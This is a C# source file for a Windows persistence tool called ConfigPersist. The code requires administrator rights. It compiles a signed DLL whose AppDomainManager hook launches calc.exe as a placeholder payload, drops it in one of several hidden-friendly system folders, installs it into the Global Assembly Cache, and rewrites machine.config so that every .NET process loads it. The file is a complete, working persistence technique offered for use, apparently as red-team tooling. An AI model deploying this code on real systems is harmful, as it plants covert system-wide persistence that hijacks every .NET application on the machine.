// Author: NotoriousRebel
// Project: ""
// License: BSD 3-Clause

using System;
using System.CodeDom.Compiler;
using System.Xml;
using System.EnterpriseServices.Internal;
using System.Collections.Generic;
using System.IO;
using System.Security.Principal;

namespace ConfigPersist
{

    class Program
    {


        private static bool IsAdminorSystem()
        {
            bool isSystem;
            using (var identity = WindowsIdentity.GetCurrent())
            {
                isSystem = identity.IsSystem;
            }

            return isSystem || WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
        }

        /// <summary>
        /// Determines if a directory is writable.
        /// </summary>
        /// <param name="dirPath">Directory path.</param>
        /// <param name="throwIfFails">Bool so if fails throw an error.</param>
        /// <returns>bool that indicates if directory is writable.</returns>
        private static bool IsDirectoryWritable(string dirPath, bool throwIfFails = false)
        {
            // https://stackoverflow.com/questions/1410127/c-sharp-test-if-user-has-write-access-to-a-folder
            // Sanity check to see if we can place our compiled dll in our special path
            try
            {
                using (FileStream fs = File.Create(
                    Path.Combine(
                        dirPath,
                        Path.GetRandomFileName()),
                    1,
                    FileOptions.DeleteOnClose))
                {
                }

                return true;
            }
            catch
            {
                if (throwIfFails)
                {
                    throw;
                }
                else
                {
                    return false;
                }
            }
        }

        /// <summary>
        /// Determines where to place compiled assembly given list of paths.
        /// </summary>
        /// <returns>Randomly selected path from path list.</returns>
        private static string GetPath()
        {
            var winPath = "C:\\WINDOWS";
            var sys32 = $"{winPath}\\System32";

            // Thank you to matterpreter for this list :)
            List<string> paths = new List<string>
            {
                $"{sys32}\\microsoft\\crypto\rsa\\machinekeys",
                $"{winPath}\\syswow64\\tasks\\microsft\\windows\\pla\\system",
                $"{winPath}\\debug\\wia",
                $"{sys32}\\tasks",
                $"{winPath}\\syswow64\\tasks",
                $"{winPath}\\registration\\crmlog",
                $"{sys32}\\com\\dmp",
                $"{sys32}\\fxstmp",
                $"{sys32}\\spool\\drivers\\color",
                $"{sys32}\\spool\\printers",
                $"{sys32}\\spool\\servers",
                $"{winPath}\\syswow64\\com\\dmp",
                $"{winPath}\\syswow64\\fxstmp",
                $"{winPath}\\temp",
                $"{winPath}\\tracing",
            };
            paths = paths.FindAll(path => Directory.Exists(path) && IsDirectoryWritable(path));
            if (paths.Count == 0)
            {
                // Sanity check
                // If for some reason every path fails we will just use our current directory
                paths.Add(Environment.CurrentDirectory);
            }

            var random = new Random();

            // return random path where we will place our strong signed assembly
            return paths[random.Next(paths.Count)];
        }

        /// <summary>
        /// Loads our strong signed .net assembly into the GAC.
        /// </summary>
        /// <param name="path">Path to .net assembly.</param>
        private static bool InstallAssembly(string path)
        {
            try
            {
                var publisher = new Publish();
                publisher.GacInstall(path);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An exception occurred while attempting to install .net assembly into GAC {e}");
                return false;
            }

            return true;
        }

        private static Tuple<string, string> CompileDLL(string dllPath)
        {
            var malCSharp = @"using System;
                namespace Context {
                    public sealed class ConfigHook : AppDomainManager {
                        public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
                            System.Diagnostics.Process.Start(""calc.exe"");
                            return;
                        }
                    }
                }
            ";
            CodeDomProvider objCodeCompiler = CodeDomProvider.CreateProvider("CSharp");
            var name = "test";

            // Generate name for dll
            // string dllPath = $"{Environment.CurrentDirectory}\\{name}.dll";
            // Feel free to change name of output dll
            CompilerParameters cp = new CompilerParameters();

            // ADD reference assemblies here
            cp.ReferencedAssemblies.Add("System.dll");
            cp.TreatWarningsAsErrors = false;
            dllPath = $"{dllPath}\\{name}1.dll";
            cp.OutputAssembly = dllPath;
            cp.GenerateInMemory = false;
            cp.CompilerOptions = "/optimize";
            cp.CompilerOptions = "/keyfile:..\\..\\Keyfile\\key.snk";
            cp.IncludeDebugInformation = false;
            CompilerResults cr = objCodeCompiler.CompileAssemblyFromSource(cp, malCSharp);
            Console.WriteLine(cr.PathToAssembly);
            string asmFullName;
            try
            {
                asmFullName = cr.CompiledAssembly.FullName;
            }
            catch (Exception e)
            {
                Console.WriteLine("An exception occurred while trying to get fullname, most likely due to missing keyfile!");
                Console.WriteLine(e);
                asmFullName = "test, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
            }

            if (cr.Errors.Count > 0)
            {
                Console.WriteLine("Build errors occurred");
                foreach (CompilerError ce in cr.Errors)
                {
                    Console.WriteLine(ce);
                }

                return Tuple.Create(string.Empty, string.Empty);
            }
            else
            {
                return Tuple.Create(dllPath, asmFullName);
            }
        }

        /// <summary>
        /// This is where the magic happens
        /// This is the core function that modifies the machine config
        /// It will modify it so at runtime our strong signed .net assembly will be called.
        /// </summary>
        /// <param name="configpath">Path to machine.config.</param>
        /// <param name="assemblyFullName">Full Name for Assembly.</param>
        private static bool FixConfig(string configpath, string assemblyFullName)
        {
            try
            {
                Console.WriteLine($"inside fixConfig and assemblyFullName: {assemblyFullName}");
                XmlDocument doc = new XmlDocument();
                doc.Load(configpath);
                XmlNode node = doc.SelectSingleNode("/configuration/runtime");
                Console.WriteLine($"node is: {node}");
                XmlElement ele = doc.CreateElement("appDomainManagerType");
                ele.SetAttribute("value", "Context.ConfigHook");
                node.AppendChild(ele.Clone());
                XmlElement secondEle = doc.CreateElement("appDomainManagerAssembly");
                secondEle.SetAttribute("value", assemblyFullName);
                node.AppendChild(secondEle.Clone());
                doc.Save(configpath);
            }
            catch (Exception e)
            {
                Console.WriteLine($"An exception has occurred while attempting to 'fix' config: {e}");
                return false;
            }

            return true;
        }

        static void Main(string[] args)
        {
            try
            {
                if (!IsAdminorSystem())
                {
                    Console.WriteLine("Must be administrator for technique to work, exiting program!");
                    Environment.Exit(-1);
                }

                Console.WriteLine(Environment.CurrentDirectory);
                var dirPath = GetPath();
                Console.WriteLine($"path is: {dirPath}");
                (string dllPath, string asmFullName) = CompileDLL(dirPath);
                Console.WriteLine($"dllPath is {dllPath}");
                Console.WriteLine($"asmFullName is: {asmFullName}");
                bool loaded = InstallAssembly(dllPath);
                if (loaded == false)
                {
                    throw new Exception("Unable to install assembly into GAC");
                }

                Console.WriteLine($"Successfully added assembly to CLR: {asmFullName}");
                var configPath = System.Runtime.InteropServices.RuntimeEnvironment.SystemConfigurationFile;
                Console.WriteLine(configPath);
                bool configFixed = FixConfig(configPath, asmFullName);
                if (configFixed == false)
                {
                    throw new Exception("Unable to modify config");
                }

                // clean up after ourselves as it's been installed onto GAC
                try
                {
                    //File.Delete(dllPath);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"An error occurred while attempting to delete dllPath: {e}");
                }

                Console.ReadLine();
            }
            catch (Exception e)
            {
                Console.WriteLine($"An error has occurred: {e}");
                Console.ReadLine();
            }
        }
    }
}
